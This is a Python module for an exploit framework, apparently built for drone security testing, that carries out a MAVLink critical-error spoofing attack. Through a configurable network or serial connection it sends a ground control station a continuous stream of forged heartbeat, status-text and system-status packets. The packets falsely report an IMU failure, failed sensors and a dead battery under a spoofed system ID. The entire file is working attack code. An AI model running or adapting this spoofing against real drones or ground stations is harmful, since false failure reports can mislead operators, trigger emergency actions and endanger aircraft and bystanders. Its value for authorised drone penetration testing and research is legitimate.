from sploitkit import Config, Option
from lib.base import MAVLinkModule
from pymavlink import mavutil
import time
import sys
import os

# Force MAVLink 2.0 (critical for proper message routing)
os.environ['MAVLINK20'] = '1'

class CriticalErrorSpoofing(MAVLinkModule):
    """
    Spoof critical error messages to mislead the Ground Control Station (GCS) about the drone's status.

    Connection:
        For spoofing, use 'udpout:' to send TO the target port:
        - Network (recommended): udpout:10.13.0.6:14550
        - Network (bidirectional): udp:10.13.0.6:14550
        - Serial: /dev/ttyUSB0 (Linux) or COM3 (Windows)

    Usage:
        set connection udpout:10.13.0.6:14550
        set error_message "CRITICAL ERROR: IMU FAILURE"
        run
    """

    # Inherit connection config from base class and add module-specific options
    config = MAVLinkModule.config + Config({
        Option(
            name='error_message',
            description='Critical error message to display (max 50 chars)',
            required=False,
        ): "CRITICAL ERROR: IMU FAILURE",  # Default message
        Option(
            name='duration',
            description='Duration of spoofing in seconds (0 for infinite)',
            required=False,
        ): "60",  # Default value
        Option(
            name='update_rate',
            description='Error message update rate in Hz',
            required=False,
        ): "1",  # Default: 1 Hz
        Option(
            name='src_system_id',
            description='Source system ID to spoof (what system the message appears from)',
            required=False,
        ): "1",  # Default: System 1
        Option(
            name='src_component_id',
            description='Source component ID to spoof (what component the message appears from)',
            required=False,
        ): "1",  # Default: Component 1
        Option(
            name='tgt_system_id',
            description='Target system ID (who to send to, 0 for broadcast)',
            required=False,
        ): "0",  # Default: Broadcast
        Option(
            name='tgt_component_id',
            description='Target component ID (which component to target, 0 for broadcast)',
            required=False,
        ): "0",  # Default: Broadcast
    })

    def send_critical_heartbeat(self, master):
        """
        Send a MAVLink heartbeat message indicating a critical state.
        """
        master.mav.heartbeat_send(
            type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=3,  # GUIDED mode
            system_status=mavutil.mavlink.MAV_STATE_CRITICAL  # Critical state
        )

    def send_statustext(self, master, message):
        """
        Send a MAVLink STATUSTEXT message indicating a critical error.
        """
        # Ensure message fits in 50 bytes (MAVLink limit)
        message_bytes = message.encode('utf-8')[:50]

        master.mav.statustext_send(
            severity=mavutil.mavlink.MAV_SEVERITY_CRITICAL,
            text=message_bytes
        )

    def send_sys_status(self, master):
        """
        Send a MAVLink SYS_STATUS message with critical error indicators.
        """
        master.mav.sys_status_send(
            onboard_control_sensors_present=0xFFFFFFFF,  # All sensors present
            onboard_control_sensors_enabled=0xFFFFFFFF,  # All sensors enabled
            onboard_control_sensors_health=0x00000000,   # All sensors FAILED
            load=1000,  # 100% system load
            voltage_battery=0,  # Dead battery
            current_battery=0,
            battery_remaining=0,  # 0% battery
            drop_rate_comm=1000,  # 100% packet loss
            errors_comm=100,
            errors_count1=100,
            errors_count2=100,
            errors_count3=100,
            errors_count4=100
        )

    def run(self):
        # Retrieve configuration options
        error_message = self.config['error_message']
        duration = int(self.config['duration'])
        update_rate = int(self.config['update_rate'])
        src_system_id = int(self.config['src_system_id'])
        src_component_id = int(self.config['src_component_id'])
        tgt_system_id = int(self.config['tgt_system_id'])
        tgt_component_id = int(self.config['tgt_component_id'])

        separator = "=" * 80
        self.logger.info(separator)
        self.logger.info("Critical Error Spoofing Attack")
        self.logger.info(separator)
        self.logger.warning("This will inject false critical error messages into the MAVLink stream")
        self.logger.info(f"Error Message: {error_message}")
        self.logger.info(f"Update Rate: {update_rate} Hz")
        self.logger.info(f"Source: System ID {src_system_id}, Component ID {src_component_id}")
        self.logger.info(f"Target: System ID {tgt_system_id}, Component ID {tgt_component_id}")
        if duration > 0:
            self.logger.info(f"Duration: {duration} seconds")
        else:
            self.logger.info("Duration: Infinite (Ctrl+C to stop)")
        self.logger.info(separator)

        master = None
        try:
            # Connect to the MAVLink device (supports both serial and network)
            master = self.connect_drone()

            # Set spoofed source and target IDs
            master.source_system = src_system_id
            master.source_component = src_component_id
            master.target_system = tgt_system_id
            master.target_component = tgt_component_id

            start_time = time.time()
            count = 0
            interval = 1.0 / update_rate

            # Main spoofing loop
            while True:
                # Check if the duration has been reached
                if duration > 0 and (time.time() - start_time >= duration):
                    self.logger.info(f"Spoofing duration of {duration} seconds reached. Stopping...")
                    break

                # Send spoofed critical state messages
                self.send_critical_heartbeat(master)
                self.send_statustext(master, error_message)
                self.send_sys_status(master)

                count += 1

                if count % (update_rate * 10) == 0:
                    elapsed = time.time() - start_time
                    self.logger.info(f"Sent {count * 3} spoofed error packets ({elapsed:.1f}s elapsed)")

                time.sleep(interval)

            self.logger.success(f"\n{separator}")
            self.logger.success(f"Critical Error Spoofing Completed")
            self.logger.success(f"Total messages sent: {count * 3}")
            self.logger.success(f"{separator}")

        except KeyboardInterrupt:
            self.logger.info("\n\nAttack interrupted by user")
        except Exception as e:
            self.logger.error(f"Error during spoofing: {str(e)}")
            import traceback
            self.logger.error(traceback.format_exc())
        finally:
            # Clean up connection
            self.close_connection(master)
